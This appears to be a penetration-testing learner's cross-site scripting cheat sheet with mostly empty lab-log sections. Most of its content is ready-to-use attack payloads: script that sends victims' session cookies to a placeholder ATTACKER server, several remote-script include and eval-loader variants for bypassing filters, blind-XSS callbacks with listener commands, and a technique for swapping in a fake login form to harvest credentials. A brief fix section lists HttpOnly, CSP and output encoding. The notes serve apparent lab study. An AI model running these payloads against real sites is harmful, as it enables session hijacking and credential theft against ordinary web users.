# Cross-Site Scripting (XSS)

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Inject JavaScript that runs in another user's browser. Three types: **reflected** (in the response to a request), **stored** (saved server-side, hits every viewer), **DOM** (client-side JS sink).

## Detection & basic payloads
```html
<script>alert(window.origin)</script>       <!-- classic PoC (window.origin confirms context) -->
<img src=x onerror=alert(document.cookie)>   <!-- when <script> is filtered -->
<plaintext>                                   <!-- breaks page = injection point found -->
"><script>alert(1)</script>                   <!-- break out of an attribute first -->
```
Find the context (HTML body / attribute / JS / URL) → craft the break-out. Automate discovery with **XSStrike** (`xsstrike.py -u "http://t/?x=test"`).

## DOM manipulation (impact demo)
```html
<script>document.title='pwned'</script>
<script>document.getElementById('loginform').innerHTML='<form action=//ATTACKER>...'</script>  <!-- phishing/defacement -->
```

## Session hijacking via XSS (stored XSS → cookie theft)
Highest-impact XSS. Inject a script that exfils the victim's cookie to your server, then replay it:
```html
<script src="http://ATTACKER/s.js"></script>
<!-- s.js: new Image().src='http://ATTACKER/?c='+document.cookie; -->
```
- A simple logger on your side records the cookie (backend source not stored here).
- **Replay:** set the stolen `PHPSESSID` in your browser (DevTools → Storage → Cookies) → refresh → you're the victim.
- **Mitigation that kills this:** `HttpOnly` cookie flag (JS can't read it). Also CSP, output encoding.

## Discovery tooling & setup
```bash
python xsstrike.py -u "http://TARGET/index.php?task=test"   # automated XSS fuzzing on a parameter
sudo php -S 0.0.0.0:80       # host remote script / receiver for the victim to call back to
python3 -m http.server 80    # simplest callback receiver (see hits in the access log)
sudo nc -lvnp 80             # raw listener to confirm a callback fired
```
URL-encoded reflected test (drop straight into a param):
`?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E`

## Remote-JS include — payload variants
Same goal (load attacker JS), different break-outs/filter bypasses. Cycle these to find what the sink accepts:
```html
<script src=http://ATTACKER/x></script>
'><script src=http://ATTACKER/x></script>      <!-- break out of a single-quoted attr -->
"><script src=http://ATTACKER/x></script>      <!-- break out of a double-quoted attr -->
<script>$.getScript("http://ATTACKER/x")</script>                      <!-- if jQuery present -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","//ATTACKER");a.send();</script>
```
Numbering each probe (`/1`, `/2`, `/3`) in your callback log tells you *which* field/break-out fired.

## Blind XSS
Payload fires on a page you never see (admin panel, moderation queue, support ticket, log viewer). You can't observe `alert()` — so the payload **must call back**. Use the remote-JS-include variants above pointed at your server; a hit in your log = the payload executed somewhere privileged. Typical injection points: name/username fields, contact forms, user-agent, comments awaiting moderation.

## Phishing via XSS (credential harvest)
Technique, not a drop-in payload. On a page that reflects a URL/image parameter into an `<img src>` (or similar), break out and inject a fake login form whose `action` points at your server, then remove the legit form so the victim only sees yours:
```js
document.getElementById('urlform').remove();   // hide the real input so the fake form is the only option
```
Delivery: the app's own "send to user / submit for review" feature (e.g. a `send.php`) mails your crafted URL to the victim; their submitted creds land in your receiver's log. Keep the injected form minimal (username + password + submit) so it blends in.

## Fix
Context-aware **output encoding** (HTML/attr/JS/URL), input validation, CSP, `HttpOnly`+`Secure` cookies, frameworks that auto-escape.

> Workflow: find the sink → confirm with `alert(window.origin)` → identify stored vs reflected (stored = far worse, hits everyone) → demo real impact with cookie theft. `HttpOnly` is the one flag that defuses cookie-stealing XSS.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
